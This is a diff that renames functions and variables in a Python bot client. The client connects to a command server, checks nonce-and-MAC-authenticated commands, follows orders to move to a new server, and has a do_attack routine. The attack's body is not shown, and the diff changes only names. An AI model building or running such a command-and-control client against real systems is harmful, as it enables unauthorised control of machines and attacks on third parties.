@@ -5,13 +5,13 @@ import socket
 import time
 import hashlib
 
-def compute_mac(nonce, secret):
+def computeMac(nonce, secret):
     """Compute the first 8 hex digits of SHA-256(nonce + secret)."""
     combo = nonce + secret
     sha_val = hashlib.sha256(combo.encode('utf-8')).hexdigest()
     return sha_val[:8]
 
-def connect_loop(host, port, nick, secret):
+def connectLoop(host, port, nick, secret):
     """
     Continuously attempt to connect to the server.
     Once connected, send the join message and then handle commands.
@@ -77,20 +77,20 @@ def handle_commands(sock, nick, secret, seen_nonces, command_count):
             cmdline = cmdline.strip()
             if not cmdline:
                 continue
-            parts = cmdline.split()
-            if len(parts) < 3:
+            tokens = cmdline.split()
+            if len(tokens) < 3:
                 # Not a valid command format, ignore
                 continue
 
-            nonce, mac, command = parts[0], parts[1], parts[2]
-            args = parts[3:]
+            nonce, mac, command = tokens[0], tokens[1], tokens[2]
+            args = tokens[3:]
 
             # AUTHENTICATE
             if nonce in seen_nonces:
                 # Already used nonce, ignore
                 continue
 
-            computed = compute_mac(nonce, secret)
+            computed = computeMac(nonce, secret)
             if computed != mac:
                 # Invalid MAC
                 continue
@@ -135,10 +135,10 @@ def handle_commands(sock, nick, secret, seen_nonces, command_count):
                     new_host, new_port = hostport[0], int(hostport[1])
                     # Reconnect loop to the new server
                     # We keep the same seen_nonces and command_count
-                    reconnect_to_new(
+                    reconnect_server(
                         new_host, new_port, nick, secret, seen_nonces, command_count
                     )
-                # After returning from reconnect_to_new, we basically
+                # After returning from reconnect_server, we basically
                 # are done with the old server. We'll attempt to reconnect
                 # if needed. So just return here to stop reading old socket.
                 return command_count, False
@@ -176,7 +176,7 @@ def do_attack(target, nick, nonce):
         reason = str(e).lower().replace(" ", "_")
         return f"-attack {nick} FAIL {reason}\n"
 
-def reconnect_to_new(host, port, nick, secret, seen_nonces, command_count):
+def reconnect_server(host, port, nick, secret, seen_nonces, command_count):
     """
     Connects to the new server location and continues reading commands
     until an exception or shutdown. This is a separate connect loop
@@ -222,7 +222,7 @@ def main():
     nick = sys.argv[2]
     secret = sys.argv[3]
 
-    connect_loop(host, port, nick, secret)
+    connectLoop(host, port, nick, secret)
 
 if __name__ == "__main__":
     main()
